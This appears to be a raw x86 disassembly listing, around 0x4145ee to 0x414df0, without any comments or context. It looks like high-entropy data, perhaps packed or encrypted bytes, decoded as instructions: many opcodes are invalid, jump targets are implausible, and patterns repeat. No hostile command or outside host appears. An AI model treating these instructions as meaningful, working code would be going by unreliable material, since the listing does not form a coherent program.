  4145ee:	inc    eax
  4145ef:	inc    eax
  4145f0:	add    BYTE PTR [ecx+0x62],al
  4145f3:	bound  eax,QWORD PTR [eax]
  4145f5:	int3   
  4145f6:	inc    eax
  4145f7:	inc    ebx
  4145f8:	add    eax,0x43624041
  4145fd:	adc    BYTE PTR [ecx+0x5],al
  414600:	inc    eax
  414601:	dec    ecx
  414602:	fadd   QWORD PTR [ebp-0x58]
  414605:	jo     0x41464a
  414607:	and    al,0xa5
  414609:	sar    DWORD PTR [edi],1
  41460b:	test   al,0xbc
  41460d:	jge    0x414642
  41460f:	inc    eax
  414610:	dec    ebp
  414611:	popa   
  414612:	enter  0x6216,0x29
  414616:	add    al,0x40
  414618:	in     eax,0x79
  41461a:	push   edx
  41461b:	mov    al,0x40
  41461d:	lock inc edi
  41461f:	inc    eax
  414620:	dec    edx
  414621:	aam    0xc5
  414623:	inc    ebx
  414624:	xor    BYTE PTR [ebp-0x2c9cdc7b],cl
  41462a:	fld    DWORD PTR [edx+0x62]
  41462d:	inc    ebx
  41462e:	inc    eax
  41462f:	adc    BYTE PTR ds:0x4158cc40,al
  414635:	inc    ebx
  414636:	bound  eax,QWORD PTR [ecx+0x40]
  414639:	add    eax,0x4140
  41463e:	and    eax,0x40400062
  414643:	add    eax,0x84404340
  414648:	int3   
  414649:	js     0x41464b
  41464b:	inc    ecx
  41464c:	adc    BYTE PTR [edx+0xf],ah
  41464f:	fild   QWORD PTR [eax+0x4a4e4043]
  414655:	add    eax,0x90d7cc41
  41465a:	inc    eax
  41465b:	addr16 pop edi
  41465d:	fs hlt 
  41465f:	inc    edx
  414660:	xor    edi,edi
  414662:	inc    eax
  414663:	aas    
  414664:	inc    esp
  414665:	stos   BYTE PTR es:[edi],al
  414666:	and    BYTE PTR [eax-0x36ddbcef],bl
  41466c:	adc    DWORD PTR [eax-0x2eab9458],ebp
  414672:	add    BYTE PTR [eax+0x41],al
  414675:	inc    eax
  414676:	inc    ebx
  414677:	bound  ax,DWORD PTR ds:0x40434100
  41467e:	add    eax,0x40054062
  414683:	bound  eax,QWORD PTR [ecx+0x40]
  414686:	inc    ebx
  414687:	inc    eax
  414688:	add    eax,0x25405841
  41468d:	bound  eax,QWORD PTR [eax+0x43]
  414690:	inc    eax
  414691:	adc    BYTE PTR [eax+0x67],al
  414694:	aas    
  414695:	adc    dl,BYTE PTR [edx]
  414697:	inc    ebx
  414698:	sbb    bl,BYTE PTR [edi+0x41f15640]
  41469e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41469f:	test   al,0x5a
  4146a1:	jns    0x4146e3
  4146a3:	and    edx,DWORD PTR [ebx]
  4146a5:	xor    edx,DWORD PTR ds:0x21e86410
  4146ab:	in     eax,dx
  4146ac:	mov    al,0xcd
  4146ae:	int    0xbc
  4146b0:	push   0xffffffac
  4146b2:	inc    eax
  4146b3:	mov    ds:0x5b0d460,al
  4146b8:	xor    al,0x41
  4146ba:	inc    eax
  4146bb:	cs mov esi,0xb8cbcbd5
  4146c1:	inc    ebx
  4146c2:	inc    eax
  4146c3:	pop    eax
  4146c4:	fild   DWORD PTR [eax+0x41]
  4146c7:	inc    ebx
  4146c8:	inc    eax
  4146c9:	add    eax,0x43406262
  4146ce:	inc    ecx
  4146cf:	adc    BYTE PTR [eax],al
  4146d1:	inc    eax
  4146d2:	add    eax,0x43000562
  4146d7:	add    BYTE PTR [ecx+0x40],al
  4146da:	inc    eax
  4146db:	add    eax,0x400062
  4146e0:	inc    ebx
  4146e1:	inc    eax
  4146e2:	js     0x414725
  4146e4:	inc    ecx
  4146e5:	bound  eax,QWORD PTR [eax-0x7e]
  4146e8:	inc    ebp
  4146e9:	inc    ebx
  4146ea:	or     eax,0xd9295030
  4146ef:	bound  eax,QWORD PTR [esp+eax*2-0x37]
  4146f3:	add    BYTE PTR [eax-0x1d],al
  4146f6:	jb     0x414760
  4146f8:	call   0x40889155
  4146fd:	loope  0x414715
  4146ff:	xor    al,0x2e
  414701:	jo     0x414746
  414703:	test   DWORD PTR [eax-0x30],eax
  414706:	bound  eax,QWORD PTR [eax+0x5]
  414709:	inc    ecx
  41470a:	add    BYTE PTR [ebx+0x40],al
  41470d:	inc    eax
  41470e:	inc    ecx
  41470f:	inc    eax
  414710:	inc    eax
  414711:	bound  eax,QWORD PTR ds:0x5624300
  414717:	add    BYTE PTR [eax+0x40],al
  41471a:	add    BYTE PTR [ecx+0x43],al
  41471d:	add    BYTE PTR [eax+0x41],al
  414720:	add    eax,0x40436200
  414725:	inc    eax
  414726:	add    eax,0xd4401562
  41472b:	adc    DWORD PTR [ebx+eax*2+0x44],eax
  41472f:	and    DWORD PTR [esi+0x4d],ebp
  414732:	int    0x3c
  414734:	cmp    DWORD PTR [eax+0x2f5b4940],edx
  41473a:	and    DWORD PTR [edx+0x24],eax
  41473d:	pushf  
  41473e:	inc    eax
  41473f:	mov    ds:0xd034c54a,al
  414744:	or     DWORD PTR [ebx+0x40],eax
  414747:	scas   eax,DWORD PTR es:[edi]
  414748:	xchg   edi,eax
  414749:	cld    
  41474a:	adc    BYTE PTR [esp+0x473343d1],0xc3
  414752:	lds    ebp,FWORD PTR [eax+0x41403479]
  414758:	repz inc ecx
  41475a:	inc    eax
  41475b:	add    eax,0x41624340
  414760:	test   BYTE PTR [eax],al
  414762:	and    eax,0x404043
  414767:	add    BYTE PTR ds:0x626210,al
  41476d:	add    eax,0x43404140
  414772:	inc    eax
  414773:	inc    ecx
  414774:	add    eax,0x10664062
  414779:	inc    ebx
  41477a:	bound  edi,QWORD PTR [eax+edx*4+0x40d33411]
  414781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414782:	into   
  414783:	add    eax,0xb080bcbf
  414788:	inc    eax
  414789:	sub    dl,BYTE PTR [ecx-0x3abe8b35]
  41478f:	pop    es
  414790:	inc    edx
  414791:	inc    ecx
  414792:	jbe    0x414750
  414794:	inc    esp
  414795:	pusha  
  414796:	inc    ecx
  414797:	inc    ecx
  414798:	inc    eax
  414799:	popa   
  41479a:	rol    DWORD PTR [ebp+edi*1-0x8],cl
  41479e:	dec    esp
  41479f:	inc    ebx
  4147a0:	inc    eax
  4147a1:	push   edi
  4147a2:	lahf   
  4147a3:	sbb    eax,DWORD PTR [esp+eax*2-0x4]
  4147a7:	xor    BYTE PTR [eax+0x21],al
  4147aa:	push   esi
  4147ab:	cwde   
  4147ac:	bound  esi,QWORD PTR [eax-0x3c]
  4147af:	jl     0x4147f2
  4147b1:	pop    ecx
  4147b2:	jae    0x4147b9
  4147b4:	int3   
  4147b5:	inc    ecx
  4147b6:	inc    eax
  4147b7:	add    BYTE PTR [eax],al
  4147b9:	add    BYTE PTR [eax+0x40],al
  4147bc:	inc    ebx
  4147bd:	bound  eax,QWORD PTR [eax]
  4147bf:	inc    eax
  4147c0:	inc    eax
  4147c1:	add    eax,0x62434162
  4147c6:	inc    eax
  4147c7:	js     0x4147d9
  4147c9:	inc    ecx
  4147ca:	add    eax,0x5404325
  4147cf:	bound  eax,QWORD PTR [eax+0x40]
  4147d2:	inc    ecx
  4147d3:	inc    ebx
  4147d4:	arpl   WORD PTR [ebx+0x68],bp
  4147d7:	test   al,0x47
  4147d9:	inc    eax
  4147da:	arpl   WORD PTR [eax-0x44],cx
  4147dd:	pusha  
  4147de:	sub    eax,0xe5408512
  4147e3:	jb     0x41477d
  4147e5:	test   al,0xa9
  4147e7:	dec    eax
  4147e8:	pusha  
  4147e9:	inc    eax
  4147ea:	jecxz  0x41480e
  4147ec:	cmp    DWORD PTR [edx],edx
  4147ee:	and    eax,0x436241
  4147f3:	adc    BYTE PTR [eax+0x0],al
  4147f6:	add    eax,0x62410040
  4147fb:	inc    eax
  4147fc:	add    BYTE PTR [ebx-0x34],al
  4147ff:	inc    eax
  414800:	add    eax,0x78434040
  414805:	bound  eax,QWORD PTR [ecx+0x78]
  414808:	add    eax,0x62404043
  41480d:	test   al,0x41
  41480f:	lock inc ecx
  414811:	aas    
  414812:	dec    eax
  414813:	bound  ecx,QWORD PTR [eax+0x54]
  414816:	fbld   TBYTE PTR [esi+0x36506140]
  41481c:	adc    eax,0x40b9cc23
  414821:	pop    ds
  414822:	daa    
  414823:	call   0x438511f3
  414828:	inc    eax
  414829:	dec    edx
  41482a:	inc    esi
  41482b:	push   esp
  41482c:	inc    esp
  41482d:	cmp    al,0x48
  41482f:	rol    BYTE PTR [ebx-0x5f],cl
  414832:	adc    eax,0x4063f41
  414837:	fadd   QWORD PTR [ecx+0x40]
  41483a:	add    eax,0x43436240
  41483f:	add    eax,0x62004040
  414844:	inc    eax
  414845:	add    BYTE PTR [ecx+0x40],al
  414848:	inc    ebx
  414849:	test   BYTE PTR ds:0x58054041,ah
  41484f:	inc    eax
  414850:	inc    eax
  414851:	bound  eax,QWORD PTR [eax+0x66]
  414854:	inc    ecx
  414855:	inc    eax
  414856:	add    eax,0x69554000
  41485b:	les    edx,FWORD PTR [eax+0x42]
  41485e:	dec    edx
  41485f:	ins    DWORD PTR es:[edi],dx
  414860:	inc    eax
  414861:	and    esi,DWORD PTR [ecx+0x29]
  414864:	arpl   WORD PTR [ecx],si
  414866:	(bad)  
  414867:	iret   
  414868:	inc    eax
  414869:	push   eax
  41486a:	pop    esp
  41486b:	push   eax
  41486c:	pop    ecx
  41486d:	addr16 adc eax,0xd32340f5
  414873:	(bad)  
  414874:	ror    BYTE PTR ds:0x4c304109,1
  41487a:	xchg   edi,eax
  41487b:	(bad)  
  41487e:	int    0x43
  414880:	jmp    0x562:0x40430000
  414887:	adc    BYTE PTR [ecx+0x40],al
  41488a:	and    eax,0x543cc00
  41488f:	bound  esp,QWORD PTR ds:0x40004040
  414895:	inc    eax
  414896:	inc    ecx
  414897:	inc    ecx
  414898:	add    eax,0x78434025
  41489d:	bound  eax,QWORD PTR [eax-0x7c]
  4148a0:	inc    eax
  4148a1:	inc    ecx
  4148a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148a3:	inc    eax
  4148a4:	xchg   ecx,edx
  4148a6:	les    esp,FWORD PTR [edi]
  4148a8:	xor    BYTE PTR [ebp+edx*2-0x2d],dh
  4148ac:	loope  0x4148e4
  4148ae:	xor    bh,al
  4148b0:	js     0x4148af
  4148b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b3:	xor    eax,0x7062a626
  4148b8:	inc    edi
  4148b9:	imul   DWORD PTR [edi+esi*2-0x41]
  4148bd:	arpl   WORD PTR [ebx+0x48],bx
  4148c0:	test   edx,ecx
  4148c2:	stos   DWORD PTR es:[edi],eax
  4148c3:	arpl   WORD PTR [ecx+0x40],ax
  4148c6:	inc    eax
  4148c7:	inc    ebx
  4148c8:	int3   
  4148c9:	add    BYTE PTR ds:0x56240,al
  4148cf:	inc    ebx
  4148d0:	inc    eax
  4148d1:	inc    eax
  4148d2:	add    BYTE PTR [ecx+0x62],al
  4148d5:	bound  eax,QWORD PTR [eax]
  4148d7:	int3   
  4148d8:	inc    eax
  4148d9:	inc    ebx
  4148da:	add    eax,0x43624041
  4148df:	adc    BYTE PTR [ecx+0x5],al
  4148e2:	inc    eax
  4148e3:	mov    edi,0x43bc2440
  4148e8:	sbb    BYTE PTR [edi+0x13],0xbd
  4148ec:	inc    eax
  4148ed:	cmp    ch,BYTE PTR [ebx-0x70]
  4148f0:	dec    ecx
  4148f1:	popa   
  4148f2:	(bad)  
  4148f3:	push   eax
  4148f4:	inc    eax
  4148f5:	or     al,0xac
  4148f7:	push   esi
  4148f8:	jno    0x414937
  4148fa:	push   ebx
  4148fb:	(bad)
  4148fe:	ret    
  4148ff:	inc    ebx
  414900:	in     al,dx
  414901:	and    esp,DWORD PTR [edi]
  414903:	xchg   DWORD PTR [ebx],ebp
  414905:	inc    edx
  414906:	inc    ecx
  414907:	rol    DWORD PTR ds:0x404362bf,1
  41490d:	adc    BYTE PTR ds:0x4158cc40,al
  414913:	inc    ebx
  414914:	bound  eax,QWORD PTR [ecx+0x40]
  414917:	add    eax,0x4140
  41491c:	and    eax,0x40400062
  414921:	add    eax,0x84404340
  414926:	int3   
  414927:	js     0x414929
  414929:	inc    ecx
  41492a:	adc    BYTE PTR [edx+0xf],ah
  41492d:	mov    ch,0xbf
  41492f:	enter  0x3e38,0x10
  414933:	dec    ecx
  414934:	push   esi
  414935:	push   edi
  414936:	mov    edi,0xdd426a84
  41493b:	(bad)  
  41493c:	bound  edi,QWORD PTR [esi-0x43]
  41493f:	inc    eax
  414940:	das    
  414941:	pusha  
  414942:	xor    al,0x2
  414944:	stos   BYTE PTR es:[edi],al
  414945:	xor    ecx,DWORD PTR [ebx+ebp*4+0x50]
  414949:	add    BYTE PTR [eax+0x41],al
  41494c:	inc    eax
  41494d:	inc    ebx
  41494e:	bound  ax,DWORD PTR ds:0x40434100
  414955:	add    eax,0x40054062
  41495a:	bound  eax,QWORD PTR [ecx+0x40]
  41495d:	inc    ebx
  41495e:	inc    eax
  41495f:	add    eax,0x25405841
  414964:	bound  eax,QWORD PTR [eax+0x43]
  414967:	inc    eax
  414968:	adc    BYTE PTR [ecx-0x7e],al
  41496b:	mov    esi,0x5cd6d40
  414970:	sbb    DWORD PTR [eax+0x41],0xc9302d41
  414977:	xchg   BYTE PTR [ebx+0x67],dl
  41497a:	inc    ebx
  41497b:	inc    eax
  41497c:	push   0x356f49bd
  414981:	dec    eax
  414982:	xor    BYTE PTR [eax+0x65],al
  414985:	or     al,0x50
  414987:	stos   BYTE PTR es:[edi],al
  414988:	mov    dh,BYTE PTR [edx+0x40]
  41498b:	inc    ecx
  41498c:	inc    ebx
  41498d:	inc    eax
  41498e:	add    eax,0x43406262
  414993:	inc    ecx
  414994:	adc    BYTE PTR [eax],al
  414996:	inc    eax
  414997:	add    eax,0x43000562
  41499c:	add    BYTE PTR [ecx+0x40],al
  41499f:	inc    eax
  4149a0:	add    eax,0x400062
  4149a5:	inc    ebx
  4149a6:	inc    eax
  4149a7:	js     0x4149ea
  4149a9:	inc    ecx
  4149aa:	bound  eax,QWORD PTR [eax+0x74]
  4149ad:	inc    eax
  4149ae:	add    BYTE PTR [esi+0x38],al
  4149b1:	add    eax,0x4c47d13d
  4149b6:	out    0xf3,al
  4149b8:	int    0x86
  4149ba:	inc    esi
  4149bb:	lods   al,BYTE PTR ds:[esi]
  4149bc:	test   DWORD PTR [eax+0x3],eax
  4149bf:	dec    esp
  4149c0:	inc    ecx
  4149c1:	outs   dx,DWORD PTR ds:[esi]
  4149c2:	test   BYTE PTR [edx+0x43],dh
  4149c5:	inc    eax
  4149c6:	inc    ebp
  4149c7:	xchg   ebp,eax
  4149c8:	sub    eax,0x90d1b5a9
  4149cd:	inc    eax
  4149ce:	and    DWORD PTR [edx+0x48],ebp
  4149d1:	add    eax,0x58734364
  4149d6:	int    0x62
  4149d8:	inc    eax
  4149d9:	add    eax,0x40430041
  4149de:	inc    eax
  4149df:	inc    ecx
  4149e0:	inc    eax
  4149e1:	inc    eax
  4149e2:	bound  eax,QWORD PTR ds:0x5624300
  4149e8:	add    BYTE PTR [eax+0x40],al
  4149eb:	add    BYTE PTR [ecx+0x43],al
  4149ee:	add    BYTE PTR [eax+0x41],al
  4149f1:	add    eax,0x40436200
  4149f6:	inc    eax
  4149f7:	add    eax,0x86c57662
  4149fc:	pop    ebp
  4149fd:	fadd   QWORD PTR [ebx+0x40]
  414a00:	test   DWORD PTR [ecx],esp
  414a02:	leave  
  414a03:	jp     0x4149e1
  414a05:	dec    esp
  414a06:	rol    DWORD PTR [eax+0x63],1
  414a09:	inc    edx
  414a0a:	push   edi
  414a0b:	test   al,0x98
  414a0d:	dec    edi
  414a0e:	inc    ecx
  414a0f:	inc    eax
  414a10:	add    eax,0x41624340
  414a15:	test   BYTE PTR [eax],al
  414a17:	and    eax,0x404043
  414a1c:	add    BYTE PTR ds:0x626210,al
  414a22:	add    eax,0x43404140
  414a27:	inc    eax
  414a28:	inc    ecx
  414a29:	add    eax,0x10664062
  414a2e:	inc    ebx
  414a2f:	(bad)  
  414a30:	enter  0x1b40,0x31
  414a34:	aas    
  414a35:	add    eax,0x542eddbc
  414a3a:	loope  0x414a3e
  414a3c:	lds    eax,FWORD PTR [esi+0x40334068]
  414a42:	adc    dl,BYTE PTR [ebx]
  414a44:	inc    ecx
  414a45:	xor    BYTE PTR [ebp-0x38],bl
  414a48:	mov    ebx,0xcc056040
  414a4d:	inc    ecx
  414a4e:	inc    eax
  414a4f:	add    BYTE PTR [eax],al
  414a51:	add    BYTE PTR [eax+0x40],al
  414a54:	inc    ebx
  414a55:	bound  eax,QWORD PTR [eax]
  414a57:	inc    eax
  414a58:	inc    eax
  414a59:	add    eax,0x62434162
  414a5e:	inc    eax
  414a5f:	js     0x414a71
  414a61:	inc    ecx
  414a62:	add    eax,0x5404325
  414a67:	bound  eax,QWORD PTR [eax+0x40]
  414a6a:	inc    ecx
  414a6b:	inc    ebx
  414a6c:	inc    esi
  414a6d:	sub    eax,0x416cfca7
  414a72:	inc    eax
  414a73:	and    eax,0x670544d0
  414a78:	outs   dx,BYTE PTR ds:[esi]
  414a79:	inc    ebx
  414a7a:	push   eax
  414a7b:	sub    al,0x37
  414a7d:	aad    0x86
  414a7f:	sbb    esp,esi
  414a81:	xor    BYTE PTR [eax+0x21],al
  414a84:	adc    ecx,ecx
  414a86:	xor    al,0x50
  414a88:	arpl   WORD PTR [eax+0x40],si
  414a8b:	dec    edx
  414a8c:	ficomp DWORD PTR [ebp-0x5a]
  414a8f:	pop    edx
  414a90:	add    BYTE PTR [edi+0x40],0x61
  414a94:	(bad)  [ebx]
  414a96:	add    eax,0x4c85a8a8
  414a9b:	pusha  
  414a9c:	sub    eax,DWORD PTR [esi+eax*4+0x10]
  414aa0:	mov    DWORD PTR [ebx+0x40],eax
  414aa3:	arpl   WORD PTR ds:0x436241,sp
  414aa9:	adc    BYTE PTR [eax+0x0],al
  414aac:	add    eax,0x62410040
  414ab1:	inc    eax
  414ab2:	add    BYTE PTR [ebx-0x34],al
  414ab5:	inc    eax
  414ab6:	add    eax,0x78434040
  414abb:	bound  eax,QWORD PTR [ecx+0x78]
  414abe:	add    eax,0x62404043
  414ac3:	repz sub al,0x34
  414ac6:	dec    eax
  414ac7:	(bad)  
  414ac8:	nop
  414ac9:	inc    eax
  414aca:	mov    BYTE PTR [edi-0x43],dl
  414acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ace:	mov    DWORD PTR [edx+0x10],esp
  414ad1:	inc    eax
  414ad2:	and    DWORD PTR [edi-0x32c4fac0],edi
  414ad8:	inc    ebx
  414ad9:	dec    eax
  414ada:	scas   eax,DWORD PTR es:[edi]
  414adb:	inc    ebp
  414adc:	int    0x86
  414ade:	or     eax,0x5d40d148
  414ae3:	mov    bh,0xc9
  414ae5:	sub    BYTE PTR [ecx+0x40],al
  414ae8:	add    eax,0x43436240
  414aed:	add    eax,0x62004040
  414af2:	inc    eax
  414af3:	add    BYTE PTR [ecx+0x40],al
  414af6:	inc    ebx
  414af7:	test   BYTE PTR ds:0x58054041,ah
  414afd:	inc    eax
  414afe:	inc    eax
  414aff:	bound  eax,QWORD PTR [eax+0x66]
  414b02:	inc    ecx
  414b03:	inc    eax
  414b04:	add    eax,0x1a472c00
  414b09:	inc    eax
  414b0a:	gs inc edx
  414b0c:	inc    ecx
  414b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b0e:	sar    dh,1
  414b10:	inc    ecx
  414b11:	inc    eax
  414b12:	dec    edx
  414b13:	icebp  
  414b14:	outs   dx,BYTE PTR ds:[esi]
  414b15:	dec    esp
  414b16:	mov    esp,0x6144ff47
  414b1b:	inc    ebp
  414b1c:	or     al,0x40
  414b1e:	dec    esi
  414b1f:	fsub   st,st(0)
  414b21:	inc    eax
  414b22:	addr16 xchg ebp,eax
  414b24:	push   ebx
  414b25:	fs mov esp,0x484140
  414b2b:	add    BYTE PTR [ebx+0x40],al
  414b2e:	bound  eax,QWORD PTR ds:0x25404110
  414b34:	add    ah,cl
  414b36:	inc    ebx
  414b37:	add    eax,0x40402562
  414b3c:	add    BYTE PTR [eax+0x40],al
  414b3f:	inc    ecx
  414b40:	inc    ecx
  414b41:	add    eax,0x78434025
  414b46:	bound  eax,QWORD PTR [eax-0x7c]
  414b49:	inc    eax
  414b4a:	inc    ecx
  414b4b:	mov    al,ds:0x69f84177
  414b50:	and    al,0x43
  414b52:	inc    eax
  414b53:	xor    eax,0xe8622cf4
  414b58:	push   0x3f5c4030
  414b5d:	mov    esp,0x6c449841
  414b62:	inc    eax
  414b63:	loop   0x414b8e
  414b65:	lds    eax,FWORD PTR [ecx+0x40]
  414b68:	inc    eax
  414b69:	inc    ebx
  414b6a:	int3   
  414b6b:	add    BYTE PTR ds:0x56240,al
  414b71:	inc    ebx
  414b72:	inc    eax
  414b73:	inc    eax
  414b74:	add    BYTE PTR [ecx+0x62],al
  414b77:	bound  eax,QWORD PTR [eax]
  414b79:	int3   
  414b7a:	inc    eax
  414b7b:	inc    ebx
  414b7c:	add    eax,0x43624041
  414b81:	adc    BYTE PTR [ecx+0x5],al
  414b84:	inc    eax
  414b85:	jp     0x414bea
  414b87:	cmova  eax,DWORD PTR [eax+0x23]
  414b8b:	fmul   st,st(1)
  414b8d:	test   eax,0x4085c5fa
  414b92:	bound  edx,QWORD PTR [edi+0x76]
  414b95:	mov    al,0xe8
  414b97:	repz inc ebx
  414b99:	inc    eax
  414b9a:	loope  0x414be3
  414b9c:	sub    eax,DWORD PTR [ecx-0x33]
  414b9f:	test   al,0x90
  414ba1:	cdq    
  414ba2:	in     al,dx
  414ba3:	push   ecx
  414ba4:	(bad)
  414ba7:	test   al,0x2d
  414ba9:	stos   BYTE PTR es:[edi],al
  414baa:	and    DWORD PTR [edx+eiz*2+0x43],eax
  414bae:	inc    eax
  414baf:	adc    BYTE PTR ds:0x4158cc40,al
  414bb5:	inc    ebx
  414bb6:	bound  eax,QWORD PTR [ecx+0x40]
  414bb9:	add    eax,0x4140
  414bbe:	and    eax,0x40400062
  414bc3:	add    eax,0x84404340
  414bc8:	int3   
  414bc9:	js     0x414bcb
  414bcb:	inc    ecx
  414bcc:	adc    BYTE PTR [edx+0xf],ah
  414bcf:	int    0xe0
  414bd1:	fdiv   st(2),st
  414bd3:	inc    ebx
  414bd4:	jl     0x414b81
  414bd6:	sar    DWORD PTR [edi-0x2e9cdca9],cl
  414bdc:	fwait
  414bdd:	push   eax
  414bde:	and    bh,BYTE PTR [edi+0x400030c0]
  414be4:	inc    ecx
  414be5:	inc    eax
  414be6:	inc    ebx
  414be7:	bound  ax,DWORD PTR ds:0x40434100
  414bee:	add    eax,0x40054062
  414bf3:	bound  eax,QWORD PTR [ecx+0x40]
  414bf6:	inc    ebx
  414bf7:	inc    eax
  414bf8:	add    eax,0x25405841
  414bfd:	bound  eax,QWORD PTR [eax+0x43]
  414c00:	inc    eax
  414c01:	adc    BYTE PTR [ebp+ebp*4-0x4388de6e],ch
  414c08:	ins    BYTE PTR es:[edi],dx
  414c09:	or     bl,0xba
  414c0c:	adc    eax,0xceb83433
  414c11:	lds    edx,FWORD PTR ds:0x9de5c865
  414c17:	aad    0x84
  414c19:	nop
  414c1a:	inc    eax
  414c1b:	ret    
  414c1c:	adc    al,BYTE PTR [ebp+0x46]
  414c1f:	leave  
  414c20:	push   ss
  414c21:	dec    edx
  414c22:	iret   
  414c23:	inc    ecx
  414c24:	(bad)  
  414c25:	loopne 0x414c7b
  414c27:	mov    edi,0x4368d35c
  414c2c:	mov    fs,WORD PTR [ecx]
  414c2e:	ss mov edi,0x4070c003
  414c34:	inc    ecx
  414c35:	inc    ebx
  414c36:	inc    eax
  414c37:	add    eax,0x43406262
  414c3c:	inc    ecx
  414c3d:	adc    BYTE PTR [eax],al
  414c3f:	inc    eax
  414c40:	add    eax,0x43000562
  414c45:	add    BYTE PTR [ecx+0x40],al
  414c48:	inc    eax
  414c49:	add    eax,0x400062
  414c4e:	inc    ebx
  414c4f:	inc    eax
  414c50:	js     0x414c93
  414c52:	inc    ecx
  414c53:	bound  eax,QWORD PTR [eax+0x30]
  414c56:	mov    bl,BYTE PTR [edx+0x3e]
  414c59:	mov    edi,0x68f44ade
  414c5e:	test   al,0xa1
  414c60:	inc    ecx
  414c61:	push   0x470d3116
  414c66:	rol    DWORD PTR [ebx+0x11],1
  414c69:	aad    0x20
  414c6b:	(bad)  
  414c6c:	jns    0x414bf3
  414c6e:	popa   
  414c6f:	loope  0x414cef
  414c71:	int    0x1d
  414c73:	push   0xfffffffd
  414c75:	inc    ebx
  414c76:	xchg   esi,eax
  414c77:	into   
  414c78:	pop    ds
  414c79:	mov    edi,0x9041c9ac
  414c7e:	bound  eax,QWORD PTR [eax+0x5]
  414c81:	inc    ecx
  414c82:	add    BYTE PTR [ebx+0x40],al
  414c85:	inc    eax
  414c86:	inc    ecx
  414c87:	inc    eax
  414c88:	inc    eax
  414c89:	bound  eax,QWORD PTR ds:0x5624300
  414c8f:	add    BYTE PTR [eax+0x40],al
  414c92:	add    BYTE PTR [ecx+0x43],al
  414c95:	add    BYTE PTR [eax+0x41],al
  414c98:	add    eax,0x40436200
  414c9d:	inc    eax
  414c9e:	add    eax,0x51236862
  414ca3:	mov    edi,0xca804d65
  414ca8:	inc    eax
  414ca9:	arpl   WORD PTR ds:0xc92c41bf,dx
  414caf:	inc    ebx
  414cb0:	inc    eax
  414cb1:	and    BYTE PTR [esp+eax*1-0x74],ch
  414cb5:	ins    BYTE PTR es:[edi],dx
  414cb6:	rol    DWORD PTR ds:[eax-0x51],1
  414cba:	jno    0x414cfd
  414cbc:	inc    eax
  414cbd:	add    eax,0x41624340
  414cc2:	test   BYTE PTR [eax],al
  414cc4:	and    eax,0x404043
  414cc9:	add    BYTE PTR ds:0x626210,al
  414ccf:	add    eax,0x43404140
  414cd4:	inc    eax
  414cd5:	inc    ecx
  414cd6:	add    eax,0x10664062
  414cdb:	inc    ebx
  414cdc:	bound  ecx,QWORD PTR [edi+0x1f]
  414cdf:	sub    DWORD PTR ds:0x542540ab,ecx
  414ce5:	data16 cmp al,0x31
  414ce8:	cmp    al,0x4c
  414cea:	fisttp DWORD PTR [eax+0x16]
  414ced:	mov    esp,0xbd627969
  414cf2:	cmc    
  414cf3:	mov    eax,ds:0xbc620217
  414cf8:	push   ebx
  414cf9:	inc    ebx
  414cfa:	add    BYTE PTR [ecx+0x59],0xc5
  414cfe:	inc    ecx
  414cff:	push   ebx
  414d00:	add    eax,0x4041cc
  414d05:	add    BYTE PTR [eax],al
  414d07:	inc    eax
  414d08:	inc    eax
  414d09:	inc    ebx
  414d0a:	bound  eax,QWORD PTR [eax]
  414d0c:	inc    eax
  414d0d:	inc    eax
  414d0e:	add    eax,0x62434162
  414d13:	inc    eax
  414d14:	js     0x414d26
  414d16:	inc    ecx
  414d17:	add    eax,0x5404325
  414d1c:	bound  eax,QWORD PTR [eax+0x40]
  414d1f:	inc    ecx
  414d20:	inc    ebx
  414d21:	cmp    BYTE PTR [ecx-0x19],al
  414d24:	mov    eax,ds:0xaa8c4ad5
  414d29:	pop    es
  414d2a:	inc    ebx
  414d2b:	inc    edi
  414d2c:	(bad)  
  414d2d:	and    eax,0xa8292be2
  414d32:	xor    bl,cl
  414d34:	fs mov bh,0xf8
  414d37:	sub    al,0x91
  414d39:	addr16 and eax,0x436241
  414d3f:	adc    BYTE PTR [eax+0x0],al
  414d42:	add    eax,0x62410040
  414d47:	inc    eax
  414d48:	add    BYTE PTR [ebx-0x34],al
  414d4b:	inc    eax
  414d4c:	add    eax,0x78434040
  414d51:	bound  eax,QWORD PTR [ecx+0x78]
  414d54:	add    eax,0x62404043
  414d59:	fs ds cs mov ebx,0x4c6fd569
  414d61:	inc    edi
  414d62:	dec    ecx
  414d63:	das    
  414d64:	pop    edi
  414d65:	gs inc esp
  414d67:	xor    ah,ah
  414d69:	test   ebx,esp
  414d6b:	jecxz  0x414d40
  414d6d:	push   edx
  414d6e:	xor    al,0x4e
  414d70:	popa   
  414d71:	inc    ebx
  414d72:	jge    0x414db5
  414d74:	inc    eax
  414d75:	add    eax,0x43436240
  414d7a:	add    eax,0x62004040
  414d7f:	inc    eax
  414d80:	add    BYTE PTR [ecx+0x40],al
  414d83:	inc    ebx
  414d84:	test   BYTE PTR ds:0x58054041,ah
  414d8a:	inc    eax
  414d8b:	inc    eax
  414d8c:	bound  eax,QWORD PTR [eax+0x66]
  414d8f:	inc    ecx
  414d90:	inc    eax
  414d91:	add    eax,0xd55f4500
  414d96:	lea    ebp,[eax+0x214890cd]
  414d9c:	fistp  WORD PTR [eax+0x63]
  414d9f:	jo     0x414e1a
  414da1:	out    0x2a,eax
  414da3:	push   edi
  414da4:	pop    edi
  414da5:	jmp    0x43a361e1
  414daa:	mov    edi,0xc2fadfa1
  414daf:	sub    bl,al
  414db1:	shl    DWORD PTR [ebx+0x37],1
  414db4:	inc    ebx
  414db5:	imul   esp,DWORD PTR [ebp+0x0],0x62404300
  414dbc:	add    eax,0x25404110
  414dc1:	add    ah,cl
  414dc3:	inc    ebx
  414dc4:	add    eax,0x40402562
  414dc9:	add    BYTE PTR [eax+0x40],al
  414dcc:	inc    ecx
  414dcd:	inc    ecx
  414dce:	add    eax,0x78434025
  414dd3:	bound  eax,QWORD PTR [eax-0x7c]
  414dd6:	inc    eax
  414dd7:	inc    ecx
  414dd8:	aad    0x48
  414dda:	call   0x59789d4a
  414ddf:	addr16 sbb al,ch
  414de2:	add    BYTE PTR [ecx-0x5f],dh
  414de5:	pop    edi
  414de6:	push   edx
  414de7:	and    eax,0x327adeab
  414dec:	dec    ecx
  414ded:	lahf   
  414dee:	int    0x6c
  414df0:	int    0x68
